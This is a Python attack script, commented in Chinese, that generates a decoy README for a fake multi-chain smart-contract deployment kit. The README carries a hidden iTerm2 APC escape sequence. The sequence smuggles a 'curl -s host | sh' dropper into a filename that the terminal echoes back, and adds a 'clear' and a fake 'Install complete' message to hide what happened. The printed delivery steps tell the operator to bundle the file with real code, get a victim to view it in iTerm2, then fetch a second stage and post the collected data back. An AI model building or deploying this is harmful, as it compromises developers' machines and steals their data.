#!/usr/bin/env python3
"""
stage1.py —— 生成可投递的诱饵文件

把 iTerm2 的 APC 序列塞进一个看起来正常的 README，文件名里嵌 dropper。

硬约束（都是真机实测出来的）：
  ① 文件名不能有斜杠 —— macOS 报错只保留 basename，斜杠后面全丢
  ② 文件名总长 < 255 字节 —— macOS 单个路径组件上限
  ③ 不能有控制字符 —— 3.7.9 会换成空格
  ④ 引号必须成对 —— 否则吞掉后面的分号

用法：
  python3 stage1.py --host 1.2.3.4 --port 8080 --out README.md
  python3 stage1.py --host 10.0.0.5 --port 9000 --title myproject --out README.md
"""
import argparse
import base64
import io
import os
import re
import sys

ESC = "\x1b"
ST = "\x1b\\"
MAX_COMPONENT = 255


def build_dropper(host: str, port: int, verbose: bool) -> str:
    """
    拼出注入用的路径。

    结构：  /tmp/<注入点> ; <dropper> ; clear ; echo <假提示> ; #

    报错只保留最后一个 / 之后的部分，所以 dropper 必须全在这后面。

    ★★ 两个真机踩出来的坑：
      ① 不能有斜杠 —— basename 截断会把前半段丢掉
      ② 不能有冒号 —— macOS 会把路径里的 : 显示成 /，导致 HOST:PORT 废掉
         所以端口 80 时直接省略，curl 默认就走 80
    """
    if port in (80, 0):
        target = host                      # 没有冒号
    else:
        raise SystemExit(
            "端口 %d 不能用：payload 里不能出现冒号（macOS 会把 : 转成 /）。\n"
            "请把接收端挂到 80 端口，然后 --port 80。" % port
        )

    if verbose:
        tail = ";clear;echo \u2713 Install complete.;#"
    else:
        tail = ";clear;#"

    dropper = f"(curl -s {target}|sh)&"
    # /tmp/x 是整个路径里唯一允许出现斜杠的地方
    path = "/tmp/x;" + dropper + tail
    return path


def build_apc(path: str, ident: int = 1) -> str:
    b64 = base64.b64encode(path.encode("utf-8")).decode("ascii")
    return f"{ESC}_Ga=t,f=100,t=f,i={ident};{b64}{ST}"


def check(path: str) -> list:
    problems = []
    basename = path.rsplit("/", 1)[-1]
    blen = len(basename.encode("utf-8"))
    if blen > MAX_COMPONENT:
        problems.append("basename %d 字节 > %d 上限" % (blen, MAX_COMPONENT))
    if "/" in basename:
        problems.append("basename 里有斜杠（会被截断）")
    for ch in basename:
        if ord(ch) < 0x20:
            problems.append("含控制字符 0x%02x（会被清洗）" % ord(ch))
            break
    if basename.count("'") % 2:
        problems.append("单引号数量为奇数")
    if basename.count('"') % 2:
        problems.append("双引号数量为奇数")
    return problems


DECOY_TEMPLATE = """# {title}

{blurb}

## 安装

```bash
cp -r {title} ~/
cd ~/{title}
./install.sh
```

## 目录结构

| 路径 | 作用 |
|---|---|
| `install.sh` | 安装脚本 |
| `config/` | 链配置与 RPC 端点 |
| `deploy/` | 合约部署脚本 |
| `docs/` | 使用文档 |

## 快速开始

```bash
./deploy.sh --chain tron --contract MyToken
./deploy.sh --chain bsc  --contract MyToken
```

## 支持的网络

- TRON (mainnet / nile)
- BSC
- Ethereum
- Arbitrum
- Base
- Polygon

## 常见问题

**Q: 提示 `insufficient funds`？**
A: 检查部署钱包余额，TRON 上还需要带宽或 TRX 抵押。

**Q: RPC 超时？**
A: 在 `config/rpc.json` 里换一个端点。

**Q: 合约验证失败？**
A: 确认 constructor 参数和部署时一致。

## 许可

MIT
"""


BLURBS = [
    "一个 TRON / EVM 多链合约部署工具包。",
    "轻量的多链部署脚手架，支持 TRON、BSC、Ethereum 等网络。",
    "用于快速部署和验证智能合约的命令行工具。",
    "多链合约部署与配置管理工具。",
]


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--host", required=True, help="接收端地址（IP 或域名）")
    ap.add_argument("--port", type=int, default=8080)
    ap.add_argument("--out", default="README.md")
    ap.add_argument("--title", default="anubis-deploy-kit")
    ap.add_argument("--blurb", default=None)
    ap.add_argument("--verbose", action="store_true",
                    help="回显假完成提示（更像正常结束）")
    ap.add_argument("--apc-first", action="store_true", default=True,
                    help="APC 放文件最前面（默认）")
    args = ap.parse_args()

    path = build_dropper(args.host, args.port, args.verbose)
    problems = check(path)
    if problems:
        print("✗ payload 有问题：", file=sys.stderr)
        for p in problems:
            print("   -", p, file=sys.stderr)
        sys.exit(1)

    basename = path.rsplit("/", 1)[-1]
    blurb = args.blurb or BLURBS[hash(args.title) % len(BLURBS)]
    decoy = DECOY_TEMPLATE.format(title=args.title, blurb=blurb)
    apc = build_apc(path)

    content = apc + "\n" + decoy
    with io.open(args.out, "w", encoding="utf-8", newline="") as f:
        f.write(content)

    raw = content.encode("utf-8")

    print("=" * 78)
    print("  诱饵文件已生成")
    print("=" * 78)
    print("  输出文件      %s" % args.out)
    print("  文件大小      %d 字节" % len(raw))
    print()
    print("  注入路径      %s" % path)
    print("  basename      %s" % basename)
    print("  basename 长度 %d 字节（上限 %d）" % (len(basename.encode()), MAX_COMPONENT))
    print("  含斜杠        %s" % ("是（仅 /tmp/）" if "/" in basename else "否"))
    print()
    print("  完整路径走一遍 shell 切分：")
    for i, seg in enumerate(path.split(";"), 1):
        mark = ""
        if "curl" in seg:
            mark = "   ← dropper"
        elif seg.strip() == "clear":
            mark = "   ← 擦掉报错"
        elif "echo" in seg:
            mark = "   ← 假提示"
        elif seg.strip() == "#":
            mark = "   ← 注释掉尾巴"
        print("    [%d] %r%s" % (i, seg, mark))
    print()
    print("  APC 序列（转义显示，%d 字节）：" % len(apc.encode()))
    print("    " + apc.replace(ESC, "\\x1b")[:160])
    print()
    print("  预测 iTerm2 会写回 PTY 的内容：")
    print("    The file \u201c%s\u201d couldn't be opened because there is no such file." % basename)
    print()
    print("=" * 78)
    print("  投递方式")
    print("=" * 78)
    print("  1. 把这个文件和一堆真代码一起打包，做成看起来正常的项目")
    print("  2. 让对方在 iTerm2 里 cat / less / git diff 它")
    print("  3. 他按一次回车 → dropper 拉取 stage2 → 采集 → POST 回来")
    print()
    print("  接收端先起好：  python3 serve.py --port %d" % args.port)


if __name__ == "__main__":
    main()
